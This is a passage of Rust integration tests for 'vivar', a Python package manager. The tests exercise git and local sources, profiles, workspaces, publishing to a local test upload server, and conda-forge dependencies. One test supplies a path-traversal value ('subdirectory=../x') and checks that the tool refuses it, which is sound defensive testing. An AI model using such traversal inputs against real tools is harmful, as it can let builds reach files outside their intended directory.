        "[project]\nname = \"my-lib\"\nversion = \"1.0\"\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();
    fs::write(
        hy.join("src").join("my_lib").join("__init__.py"),
        "VALUE = 9\n",
    )
    .unwrap();
    let hy_tar = tmp.0.join("my-lib-1.0.tar.gz");
    let status = Command::new("tar")
        .arg("-czf")
        .arg(&hy_tar)
        .arg("-C")
        .arg(&tmp.0)
        .arg("my-lib-1.0")
        .status()
        .unwrap();
    assert!(status.success());
    okn(dir, &["add", hy_tar.to_str().unwrap()]);
    assert!(
        read(&dir.join("pyproject.toml")).contains("my-lib = { path = \"my-lib-1.0.tar.gz\" }"),
        "{}",
        read(&dir.join("pyproject.toml"))
    );
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import my_lib; assert my_lib.VALUE == 9",
        ],
    );
    okn(dir, &["remove", "my-lib"]);
    // A second resolve reuses the built wheel.
    let out = okn(dir, &["lock"]);
    assert!(
        !stdout_of(&out).contains("building sdistpkg"),
        "{}",
        stdout_of(&out)
    );
    if Command::new("git").arg("--version").output().is_ok() {
        let repo = tmp.0.join("gitpkg");
        fs::create_dir_all(repo.join("src").join("gitpkg")).unwrap();
        fs::write(
            repo.join("pyproject.toml"),
            "[project]\nname = \"gitpkg\"\nversion = \"0.2\"\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
        )
        .unwrap();
        fs::write(
            repo.join("src").join("gitpkg").join("__init__.py"),
            "VALUE = 9\n",
        )
        .unwrap();
        for args in [
            vec!["init", "-q", "-b", "main"],
            vec!["-c", "user.name=t", "-c", "user.email=t@t", "add", "."],
            vec![
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "commit",
                "-q",
                "-m",
                "init",
            ],
        ] {
            let st = Command::new("git")
                .current_dir(&repo)
                .args(&args)
                .status()
                .unwrap();
            assert!(st.success(), "git {args:?}");
        }
        // The native run keeps a bare PATH; git's own directory joins it, since
        // a git reference needs git on the machine that resolves it.
        let git_dir = {
            let finder = if cfg!(windows) { "where" } else { "which" };
            let out = Command::new(finder).arg("git").output().unwrap();
            let first = String::from_utf8_lossy(&out.stdout)
                .lines()
                .next()
                .unwrap_or_default()
                .trim()
                .to_owned();
            Path::new(&first)
                .parent()
                .map(|p| p.to_path_buf())
                .unwrap_or_default()
        };
        let path_with_git = std::env::join_paths(
            std::iter::once(git_dir).chain(std::env::split_paths(bare_path())),
        )
        .unwrap();
        let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("VIVAR_BACKEND", "native")
            .env("PATH", &path_with_git)
            .args(["add", &format!("gitpkg @ git+{}@main", file_url(&repo))])
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git add failed:\n{}{}",
            stdout_of(&out),
            String::from_utf8_lossy(&out.stderr)
        );
        okn(
            dir,
            &[
                "run",
                "python",
                "-c",
                "import gitpkg; assert gitpkg.VALUE == 9",
            ],
        );
        let lock = read(&dir.join("uv.lock"));
        assert!(
            lock.contains("source = { git = \"file:///") && lock.contains("?rev=main#"),
            "{lock}"
        );
        okn(dir, &["remove", "gitpkg"]);

        // A package in a subdirectory of the repository.
        fs::create_dir_all(repo.join("sub").join("src").join("subpkg")).unwrap();
        fs::write(
            repo.join("sub").join("pyproject.toml"),
            "[project]\nname = \"subpkg\"\nversion = \"0.3\"\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
        )
        .unwrap();
        fs::write(
            repo.join("sub")
                .join("src")
                .join("subpkg")
                .join("__init__.py"),
            "VALUE = 3\n",
        )
        .unwrap();
        for args in [
            vec!["-c", "user.name=t", "-c", "user.email=t@t", "add", "."],
            vec![
                "-c",
                "user.name=t",
                "-c",
                "user.email=t@t",
                "commit",
                "-q",
                "-m",
                "sub",
            ],
        ] {
            let st = Command::new("git")
                .current_dir(&repo)
                .args(&args)
                .status()
                .unwrap();
            assert!(st.success(), "git {args:?}");
        }
        let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("VIVAR_BACKEND", "native")
            .env("PATH", &path_with_git)
            .args([
                "add",
                &format!("subpkg @ git+{}@main#subdirectory=sub", file_url(&repo)),
            ])
            .output()
            .unwrap();
        assert!(
            out.status.success(),
            "git subdirectory add failed:\n{}{}",
            stdout_of(&out),
            String::from_utf8_lossy(&out.stderr)
        );
        okn(
            dir,
            &[
                "run",
                "python",
                "-c",
                "import subpkg; assert subpkg.VALUE == 3",
            ],
        );
        let lock = read(&dir.join("uv.lock"));
        assert!(lock.contains("?subdirectory=sub&rev=main#"), "{lock}");
        let direct_url = site_packages(dir)
            .join("subpkg-0.3.dist-info")
            .join("direct_url.json");
        assert!(read(&direct_url).contains("\"subdirectory\":\"sub\""));
        // Resynced from the lock, the subdirectory build is what stays.
        okn(dir, &["sync"]);
        okn(dir, &["run", "python", "-c", "import subpkg"]);
        // A subdirectory that climbs out of the checkout is refused.
        let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
            .current_dir(dir)
            .env("VIVAR_BACKEND", "native")
            .env("PATH", &path_with_git)
            .args([
                "add",
                &format!("evil @ git+{}@main#subdirectory=../x", file_url(&repo)),
            ])
            .output()
            .unwrap();
        assert!(!out.status.success());
        assert!(String::from_utf8_lossy(&out.stderr).contains("inside the repository"));
        okn(dir, &["remove", "subpkg"]);
    }
    okn(dir, &["remove", "minipkg", "sdistpkg"]);
    assert!(!native(dir, &["run", "python", "-c", "import minipkg"])
        .status
        .success());
    // Profiles resolve natively: two conflicting groups route one package to
    // a wheelhouse index (a file:// URL) at different versions, the lock holds
    // both variants with pinned edges, and sync --profile switches between them.
    let wh = tmp.0.join("wh");
    fs::create_dir_all(&wh).unwrap();
    for (version, value) in [("1.0", 42), ("2.0", 43)] {
        let whl = wh.join(format!("variant-{version}-py3-none-any.whl"));
        let script = format!(
            "import zipfile\n\
             with zipfile.ZipFile({:?}, 'w') as z:\n\
             \x20   z.writestr('variant/__init__.py', 'VALUE = {value}\\n')\n\
             \x20   z.writestr('variant-{version}.dist-info/METADATA', 'Metadata-Version: 2.1\\nName: variant\\nVersion: {version}\\n')\n\
             \x20   z.writestr('variant-{version}.dist-info/WHEEL', 'Wheel-Version: 1.0\\nRoot-Is-Purelib: true\\nTag: py3-none-any\\n')\n\
             \x20   z.writestr('variant-{version}.dist-info/RECORD', '')\n",
            whl.to_str().unwrap()
        );
        ok(dir, &["run", "python", "-c", &script]);
    }
    let pyproject = dir.join("pyproject.toml");
    let text = read(&pyproject)
        + &format!(
            "\n[dependency-groups]\nslow = [\"variant==1.0\"]\nfast = [\"variant==2.0\"]\n\n[[tool.uv.index]]\nname = \"wh\"\nurl = \"{}\"\nexplicit = true\n\n[tool.uv.sources]\nvariant = [{{ index = \"wh\", group = \"slow\" }}, {{ index = \"wh\", group = \"fast\" }}]\n\n[tool.uv]\nconflicts = [[{{ group = \"slow\" }}, {{ group = \"fast\" }}]]\n\n[tool.vivar]\nprofiles = [\"slow\", \"fast\"]\n",
            file_url(&wh)
        );
    fs::write(&pyproject, text).unwrap();
    okn(dir, &["lock"]);
    let lock = read(&dir.join("uv.lock"));
    assert_eq!(
        lock.matches("[[package]]\nname = \"variant\"").count(),
        2,
        "{lock}"
    );
    assert!(
        lock.contains("source = { registry = \"") && lock.contains("variant-2.0-py3-none-any.whl"),
        "{lock}"
    );
    assert!(
        lock.contains("slow = [{ name = \"variant\", version = \"1.0\" }]"),
        "{lock}"
    );
    assert!(
        lock.contains("fast = [{ name = \"variant\", version = \"2.0\" }]"),
        "{lock}"
    );
    okn(dir, &["sync", "--profile", "slow"]);
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import variant; assert variant.VALUE == 42",
        ],
    );
    okn(dir, &["sync", "--profile", "fast"]);
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import variant; assert variant.VALUE == 43",
        ],
    );
    // Back to a plain project for the steps below.
    let text = read(&pyproject);
    let cut = text.find("\n[dependency-groups]\nslow").unwrap();
    fs::write(&pyproject, &text[..cut]).unwrap();
    okn(dir, &["lock"]);
    okn(dir, &["sync"]);

    // Profiles over extras of the project work the same way, and
    // `sync --extra` (or `--profile`, when the extra is declared as one)
    // installs them.
    let plain = read(&pyproject);
    let text = plain.clone()
        + &format!(
            "\n[project.optional-dependencies]\nslow = [\"variant==1.0\"]\nfast = [\"variant==2.0\"]\n\n[[tool.uv.index]]\nname = \"wh\"\nurl = \"{}\"\nexplicit = true\n\n[tool.uv.sources]\nvariant = [{{ index = \"wh\", extra = \"slow\" }}, {{ index = \"wh\", extra = \"fast\" }}]\n\n[tool.uv]\nconflicts = [[{{ extra = \"slow\" }}, {{ extra = \"fast\" }}]]\n\n[tool.vivar]\nprofiles = [\"slow\", \"fast\"]\n",
            file_url(&wh)
        );
    fs::write(&pyproject, text).unwrap();
    okn(dir, &["lock"]);
    let lock = read(&dir.join("uv.lock"));
    assert_eq!(
        lock.matches("[[package]]\nname = \"variant\"").count(),
        2,
        "{lock}"
    );
    assert!(
        lock.contains("slow = [{ name = \"variant\", version = \"1.0\" }]")
            && lock.contains("fast = [{ name = \"variant\", version = \"2.0\" }]")
            && lock.contains("conflict = { package = \"demo\", extra = \"slow\" }"),
        "{lock}"
    );
    okn(dir, &["sync", "--extra", "slow"]);
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import variant; assert variant.VALUE == 42",
        ],
    );
    okn(dir, &["sync", "--profile", "fast"]);
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import variant; assert variant.VALUE == 43",
        ],
    );
    // Two extras that exclude each other are refused before anything changes.
    let out = native(dir, &["sync", "--extra", "slow", "--extra", "fast"]);
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("exclude each other"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import variant; assert variant.VALUE == 43",
        ],
    );
    // A bundle packed with an extra-based profile active keeps that extra.
    if cfg!(unix) {
        let archive = tmp.0.join("fast.tar.gz");
        okn(dir, &["pack", "-o", archive.to_str().unwrap()]);
        let listing = Command::new("tar")
            .args(["-tzf", archive.to_str().unwrap()])
            .output()
            .unwrap();
        let listing = String::from_utf8_lossy(&listing.stdout);
        assert!(listing.contains("variant-2.0.dist-info"), "{listing}");
    }
    okn(dir, &["sync"]);
    assert!(!native(dir, &["run", "python", "-c", "import variant"])
        .status
        .success());
    // Two groups routed to the same index are one source, no conflicts needed.
    let text = plain.clone()
        + &format!(
            "\n[dependency-groups]\ndev = [\"variant\"]\ntest = [\"variant\"]\n\n[[tool.uv.index]]\nname = \"wh\"\nurl = \"{}\"\nexplicit = true\n\n[tool.uv.sources]\nvariant = [{{ index = \"wh\", group = \"dev\" }}, {{ index = \"wh\", group = \"test\" }}]\n",
            file_url(&wh)
        );
    fs::write(&pyproject, text).unwrap();
    okn(dir, &["lock"]);
    assert!(read(&dir.join("uv.lock")).contains("name = \"variant\""));
    fs::write(&pyproject, &plain).unwrap();
    okn(dir, &["lock"]);

    // A marker on a source entry forks the lock: one side per marker, each
    // routed to its own index, and the installer takes this machine's side.
    let wh_b = tmp.0.join("wh-b");
    fs::create_dir_all(&wh_b).unwrap();
    fs::copy(
        wh.join("variant-2.0-py3-none-any.whl"),
        wh_b.join("variant-2.0-py3-none-any.whl"),
    )
    .unwrap();
    let wh_a = tmp.0.join("wh-a");
    fs::create_dir_all(&wh_a).unwrap();
    fs::copy(
        wh.join("variant-1.0-py3-none-any.whl"),
        wh_a.join("variant-1.0-py3-none-any.whl"),
    )
    .unwrap();
    let text = plain.replace(
        "dependencies = [",
        "dependencies = [\n    \"variant\",",
    ) + &format!(
        "\n[[tool.uv.index]]\nname = \"a\"\nurl = \"{}\"\nexplicit = true\n\n[[tool.uv.index]]\nname = \"b\"\nurl = \"{}\"\nexplicit = true\n\n[tool.uv.sources]\nvariant = [{{ index = \"a\", marker = \"sys_platform == 'linux'\" }}, {{ index = \"b\", marker = \"sys_platform != 'linux'\" }}]\n",
        file_url(&wh_a),
        file_url(&wh_b)
    );
    fs::write(&pyproject, text).unwrap();
    let out = okn(dir, &["lock"]);
    assert!(
        stdout_of(&out).contains("lock forks on"),
        "{}",
        stdout_of(&out)
    );
    let lock = read(&dir.join("uv.lock"));
    assert!(
        lock.contains("resolution-markers = [")
            && lock.matches("[[package]]\nname = \"variant\"").count() == 2
            && lock.contains(
                "{ name = \"variant\", version = \"1.0\", marker = \"sys_platform == 'linux'\" }"
            )
            && lock.contains("{ name = \"variant\", index = \"file:///")
            && lock.contains("marker = \"sys_platform != 'linux'\" }"),
        "{lock}"
    );
    okn(dir, &["sync"]);
    let expected = if cfg!(target_os = "linux") { 42 } else { 43 };
    okn(
        dir,
        &[
            "run",
            "python",
            "-c",
            &format!("import variant; assert variant.VALUE == {expected}, variant.VALUE"),
        ],
    );
    fs::write(&pyproject, &plain).unwrap();
    okn(dir, &["lock"]);
    okn(dir, &["sync"]);
    assert!(!native(dir, &["run", "python", "-c", "import variant"])
        .status
        .success());
    // A workspace resolves natively: the lock covers the root and every member,
    // a member depending on another is met by the workspace, and both are
    // installed editable into the shared environment.
    let ws = tmp.0.join("ws");
    fs::create_dir_all(ws.join("pkgs").join("core").join("src").join("core")).unwrap();
    fs::create_dir_all(ws.join("pkgs").join("app").join("src").join("app")).unwrap();
    fs::write(
        ws.join("pyproject.toml"),
        "[project]\nname = \"ws\"\nversion = \"0.1.0\"\nrequires-python = \">=3.12\"\ndependencies = []\n\n[tool.uv.workspace]\nmembers = [\"pkgs/*\"]\n\n[tool.uv.sources]\ncore = { workspace = true }\n",
    )
    .unwrap();
    fs::write(ws.join(".python-version"), "3.12\n").unwrap();
    fs::write(
        ws.join("pkgs").join("core").join("pyproject.toml"),
        "[project]\nname = \"core\"\nversion = \"0.1.0\"\nrequires-python = \">=3.12\"\ndependencies = [\"six\"]\n\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();
    fs::write(
        ws.join("pkgs")
            .join("core")
            .join("src")
            .join("core")
            .join("__init__.py"),
        "import six\nVALUE = 1\n",
    )
    .unwrap();
    fs::write(
        ws.join("pkgs").join("app").join("pyproject.toml"),
        "[project]\nname = \"app\"\nversion = \"0.1.0\"\nrequires-python = \">=3.12\"\ndependencies = [\"core\"]\n\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n",
    )
    .unwrap();
    fs::write(
        ws.join("pkgs")
            .join("app")
            .join("src")
            .join("app")
            .join("__init__.py"),
        "from core import VALUE\n",
    )
    .unwrap();
    let app = ws.join("pkgs").join("app");
    okn(&app, &["sync"]);
    let lock = read(&ws.join("uv.lock"));
    assert!(
        lock.contains("[manifest]\nmembers = [\"app\", \"core\", \"ws\"]"),
        "{lock}"
    );
    assert!(
        lock.contains("source = { editable = \"pkgs/core\" }"),
        "{lock}"
    );
    assert!(lock.contains("name = \"six\""), "{lock}");
    assert!(ws.join(".venv").join("pyvenv.cfg").is_file() && !app.join(".venv").exists());
    okn(
        &app,
        &[
            "run",
            "python",
            "-c",
            "import app, core, six; assert core.VALUE == 1",
        ],
    );
    // Building is native too: hatchling comes from the index into a throwaway env.
    let path = dir.join("pyproject.toml");
    let text = read(&path)
        + "\n[build-system]\nrequires = [\"hatchling\"]\nbuild-backend = \"hatchling.build\"\n";
    fs::write(&path, text).unwrap();
    fs::create_dir_all(dir.join("src").join("demo")).unwrap();
    fs::write(dir.join("src").join("demo").join("__init__.py"), "").unwrap();
    let out = okn(dir, &["build"]);
    assert!(
        stdout_of(&out).contains("built dist/"),
        "{}",
        stdout_of(&out)
    );
    let built: Vec<String> = fs::read_dir(dir.join("dist"))
        .unwrap()
        .flatten()
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    assert!(built.iter().any(|f| f.ends_with(".whl")), "{built:?}");
    assert!(built.iter().any(|f| f.ends_with(".tar.gz")), "{built:?}");
    // A tool environment resolves and installs natively as well.
    let home = tmp.0.join("home");
    fs::create_dir_all(&home).unwrap();
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(dir)
        .env("VIVAR_BACKEND", "native")
        .env("PATH", bare_path())
        .env("HOME", &home)
        .env("USERPROFILE", &home)
        .env("APPDATA", &home)
        .env("XDG_DATA_HOME", home.join("data"))
        .env("UV_PYTHON_INSTALL_DIR", real_python_dir())
        .args(["tool", "install", "pycodestyle"])
        .output()
        .unwrap();
    assert!(
        out.status.success(),
        "{}{}",
        stdout_of(&out),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        stdout_of(&out).contains("pycodestyle"),
        "{}",
        stdout_of(&out)
    );
    if cfg!(unix) {
        let here = format!("{}-{}", std::env::consts::OS, std::env::consts::ARCH);
        let archive = tmp.0.join("native-x.tar.gz");
        // A local wheel travels into a cross-target bundle like any other.
        okn(dir, &["add", local_whl.to_str().unwrap()]);
        okn(
            dir,
            &[
                "pack",
                "--target",
                &here,
                "--python",
                "3.12",
                "-o",
                archive.to_str().unwrap(),
            ],
        );
        let listing = Command::new("tar")
            .args(["-tzf", archive.to_str().unwrap()])
            .output()
            .unwrap();
        let listing = String::from_utf8_lossy(&listing.stdout);
        assert!(
            listing.contains("site-packages/minipkg/__init__.py"),
            "{listing}"
        );
        okn(dir, &["remove", "minipkg"]);
        let dest = tmp.0.join("native-x-dest");
        okn(
            &tmp.0,
            &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
        );
        okn(&dest, &["run", "python", "-c", "import six, pycodestyle"]);
        let out = Command::new(dest.join(".venv").join("bin").join("pycodestyle"))
            .arg("--version")
            .output()
            .unwrap();
        assert!(out.status.success());
    }
}

#[test]
fn publish_uploads_through_the_legacy_api() {
    let tmp = TempDir::new("publish");
    let dir = &tmp.0;
    init(dir);
    // A wheel and an sdist in dist/, as `vivar build` would leave them.
    let dist = dir.join("dist");
    make_wheel(dir, &dist);
    let sdist = dist.join("minipkg-1.0.tar.gz");
    ok(
        dir,
        &[
            "run",
            "python",
            "-c",
            &format!(
                "import tarfile, io\n\
                 t = tarfile.open({:?}, 'w:gz')\n\
                 data = b'Metadata-Version: 2.1\\nName: minipkg\\nVersion: 1.0\\nSummary: tiny\\n\\nthe readme\\n'\n\
                 ti = tarfile.TarInfo('minipkg-1.0/PKG-INFO'); ti.size = len(data)\n\
                 t.addfile(ti, io.BytesIO(data)); t.close()\n",
                sdist.to_str().unwrap()
            ),
        ],
    );
    let out = ok(
        dir,
        &[
            "publish",
            "--dry-run",
            "--repository-url",
            "http://127.0.0.1:1/",
        ],
    );
    let text = stdout_of(&out);
    assert!(
        text.contains("would upload minipkg-1.0-py3-none-any.whl (minipkg 1.0 bdist_wheel)")
            && text.contains("would upload minipkg-1.0.tar.gz (minipkg 1.0 sdist)"),
        "{text}"
    );

    // An upload endpoint of our own that records what arrives.
    const SERVER: &str = r#"import http.server, json, sys, email.parser
out, n, mode = sys.argv[1], int(sys.argv[2]), sys.argv[3]
seen = []
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_POST(self):
        body = self.rfile.read(int(self.headers['Content-Length']))
        msg = email.parser.BytesParser().parsebytes(b'Content-Type: ' + self.headers['Content-Type'].encode() + b'\r\n\r\n' + body)
        fields = {}
        for part in msg.get_payload():
            name = part.get_param('name', header='content-disposition')
            fn = part.get_param('filename', header='content-disposition')
            if fn: fields['content'] = {'filename': fn, 'size': len(part.get_payload(decode=True))}
            else: fields.setdefault(name, []).append(part.get_payload(decode=True).decode())
        fields['auth'] = self.headers.get('Authorization', '')
        seen.append(fields)
        if mode == 'exists':
            self.send_response(400); self.end_headers(); self.wfile.write(b'400 File already exists.')
        else:
            self.send_response(200); self.end_headers(); self.wfile.write(b'OK')
s = http.server.HTTPServer(('127.0.0.1', 0), H)
print(s.server_address[1], flush=True)
for _ in range(n): s.handle_request()
json.dump(seen, open(out, 'w'))
"#;
    let python = dir.join(".venv").join(BIN).join(exe("python"));
    let serve = |mode: &str, n: &str, record: &Path| {
        let mut child = Command::new(&python)
            .args(["-c", SERVER, record.to_str().unwrap(), n, mode])
            .stdout(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        let mut port = String::new();
        std::io::BufRead::read_line(
            &mut std::io::BufReader::new(child.stdout.take().unwrap()),
            &mut port,
        )
        .unwrap();
        (child, format!("http://127.0.0.1:{}/", port.trim()))
    };

    let record = tmp.0.join("seen.json");
    let (mut server, url) = serve("ok", "2", &record);
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(dir)
        .env("VIVAR_PUBLISH_TOKEN", "s3cret")
        .args(["publish", "--repository-url", &url])
        .output()
        .unwrap();
    assert!(server.wait().unwrap().success());
    assert!(
        out.status.success(),
        "{}{}",
        stdout_of(&out),
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        stdout_of(&out).contains("published 2 file(s)"),
        "{}",
        stdout_of(&out)
    );
    let seen = read(&record);
    // Basic auth with __token__, the legacy form fields, the file itself.
    assert!(
        seen.contains("\"auth\": \"Basic X190b2tlbl9fOnMzY3JldA==\""),
        "{seen}"
    );
    for needle in [
        "\":action\": [\"file_upload\"]",
        "\"name\": [\"minipkg\"]",
        "\"version\": [\"1.0\"]",
        "\"filetype\": [\"bdist_wheel\"]",
        "\"filetype\": [\"sdist\"]",
        "\"pyversion\": [\"py3\"]",
        "\"pyversion\": [\"source\"]",
        "\"summary\": [\"tiny\"]",
        "\"description\": [\"the readme",
        "\"license_expression\": [\"MIT\"]",
        "\"filename\": \"minipkg-1.0-py3-none-any.whl\"",
        "\"filename\": \"minipkg-1.0.tar.gz\"",
        "\"sha256_digest\"",
    ] {
        assert!(seen.contains(needle), "{needle} missing from\n{seen}");
    }

    // An index that already has the file: an error, unless --skip-existing.
    let (mut server, url) = serve("exists", "1", &record);
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(dir)
        .env("VIVAR_PUBLISH_TOKEN", "s3cret")
        .args(["publish", "--repository-url", &url])
        .output()
        .unwrap();
    assert!(server.wait().unwrap().success());
    assert!(!out.status.success());
    assert!(
        String::from_utf8_lossy(&out.stderr).contains("HTTP 400"),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    let (mut server, url) = serve("exists", "2", &record);
    let out = Command::new(env!("CARGO_BIN_EXE_vivar"))
        .current_dir(dir)
        .env("VIVAR_PUBLISH_TOKEN", "s3cret")
        .args(["publish", "--skip-existing", "--repository-url", &url])
        .output()
        .unwrap();
    assert!(server.wait().unwrap().success());
    assert!(
        out.status.success(),
        "{}",
        String::from_utf8_lossy(&out.stderr)
    );
    assert!(
        stdout_of(&out).contains("published 0 file(s)")
            && stdout_of(&out).contains("2 already there"),
        "{}",
        stdout_of(&out)
    );
}

#[test]
#[ignore = "slow: downloads a Python and a few packages from conda-forge; run with --include-ignored (CI does)"]
fn native_dependencies_from_conda_forge() {
    let tmp = TempDir::new("conda");
    let dir = &tmp.0;
    ok(dir, &["init", "demo", "--python", "3.12", "--no-sync"]);
    // A native dependency: the solve brings python itself, the prefix is
    // linked into .venv, and `run` works on it.
    ok(dir, &["add", "--native", "tzdata"]);
    let pyproject = read(&dir.join("pyproject.toml"));
    assert!(
        pyproject.contains("[tool.vivar.native-dependencies]")
            && pyproject.contains("tzdata = \"*\""),
        "{pyproject}"
    );
    let lock = read(&dir.join("vivar-native.lock"));
    assert!(
        lock.contains("name = \"python\"") && lock.contains("name = \"tzdata\""),
        "{lock}"
    );
    assert!(dir.join(".venv").join("conda-meta").is_dir());
    ok(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import os, sys, zoneinfo; assert 'conda-meta' in os.listdir(sys.prefix), sys.prefix",
        ],
    );
    // PyPI packages install into the prefix's Python.
    ok(dir, &["add", "pycodestyle"]);
    ok(dir, &["run", "python", "-c", "import pycodestyle"]);
    // A Python package from conda-forge satisfies the PyPI requirement on
    // it: no second copy, no package entry in uv.lock.
    ok(dir, &["add", "--native", "six"]);
    ok(dir, &["add", "six"]);
    ok(
        dir,
        &[
            "run",
            "python",
            "-c",
            "import six, sys; assert six.__file__.startswith(sys.prefix), six.__file__",
        ],
    );
    let lock = read(&dir.join("uv.lock"));
    assert!(
        !lock.contains("[[package]]\nname = \"six\"") && lock.contains("{ name = \"six\" }"),
        "{lock}"
    );
    // Native packages show up in the license inventory, the SBOM and `check`.
    let listing = stdout_of(&ok(dir, &["licenses"]));
    assert!(
        listing.contains("tzdata") && listing.contains("pycodestyle"),
        "{listing}"
    );
    let sbom = stdout_of(&ok(
        dir,
        &["export", "sbom", "--format", "cyclonedx", "--output", "-"],
    ));
    assert!(
        sbom.contains("pkg:conda/tzdata@") && sbom.contains("pkg:pypi/pycodestyle@"),
        "{sbom}"
    );
    ok(dir, &["check", "--no-audit"]);
    let spdx = stdout_of(&ok(
        dir,
        &["export", "sbom", "--format", "spdx", "--output", "-"],
    ));
    assert!(spdx.contains("pkg:conda/tzdata@"), "{spdx}");
    // A deny list added after the lock still stops the sync and `check`.
    let pyproject_path = dir.join("pyproject.toml");
    let text = read(&pyproject_path).replace("deny = []", "deny = [\"tzdata\"]");
    fs::write(&pyproject_path, text).unwrap();
    fails_with(dir, &["sync"], "deny list");
    assert!(!vivar(dir, &["check", "--no-audit"]).status.success());
    let text = read(&pyproject_path).replace("deny = [\"tzdata\"]", "deny = []");
    fs::write(&pyproject_path, text).unwrap();
    // An extra of a package the prefix provides cannot be resolved.
    fs::write(
        &pyproject_path,
        read(&pyproject_path).replace("\"six\",", "\"six[nothing]\","),
    )
    .unwrap();
    fails_with(
        dir,
        &["lock"],
        "extra of a package the native environment provides",
    );
    fs::write(
        &pyproject_path,
        read(&pyproject_path).replace("\"six[nothing]\",", "\"six\","),
    )
    .unwrap();
    let doctor = stdout_of(&ok(dir, &["doctor"]));
    assert!(
        doctor.contains("native dependencies: 2 declared"),
        "{doctor}"
    );
    // Dropping the native six leaves the PyPI requirement to PyPI.
    ok(dir, &["remove", "--native", "six"]);
    assert!(
        read(&dir.join("uv.lock")).contains("[[package]]\nname = \"six\""),
        "{}",
        read(&dir.join("uv.lock"))
    );
    ok(dir, &["run", "python", "-c", "import six"]);
    assert!(!read(&dir.join("vivar-native.lock")).contains("name = \"six\""));
    // Anaconda's commercial channels are refused.
    let text = read(&dir.join("pyproject.toml")) + "\n[tool.vivar]\nchannels = [\"defaults\"]\n";
    let with_defaults = text.replace(
        "[tool.vivar.native-dependencies]",
        "[tool.vivar]\nchannels = [\"defaults\"]\n\n[tool.vivar.native-dependencies]",
    );
    let with_defaults = with_defaults
        .trim_end_matches("\n[tool.vivar]\nchannels = [\"defaults\"]\n")
        .to_owned()
        + "\n";
    fs::write(dir.join("pyproject.toml"), &with_defaults).unwrap();
    fails_with(dir, &["lock"], "commercial");
    let restored = with_defaults.replace("[tool.vivar]\nchannels = [\"defaults\"]\n\n", "");
    fs::write(dir.join("pyproject.toml"), restored).unwrap();
    ok(dir, &["lock"]);
    // A packed prefix is carried whole and rewritten for its new home.
    if cfg!(unix) {
        let archive = tmp.0.join("native.tar.gz");
        ok(dir, &["pack", "-o", archive.to_str().unwrap()]);
        let dest = tmp.0.join("native-dest");
        ok(
            &tmp.0,
            &["unpack", archive.to_str().unwrap(), dest.to_str().unwrap()],
        );
        ok(
            &dest,
            &[
                "run",
                "python",
                "-c",
                "import ssl, pycodestyle, six, zoneinfo",
            ],
        );
        let out = stdout_of(&ok(&dest, &["verify"]));
        assert!(out.contains("integrity: all bundled files match"), "{out}");
        assert!(
            !dest.join("vivar-native.lock").exists()
                || read(&dest.join("vivar-native.lock")).contains("tzdata")
        );
    }
}
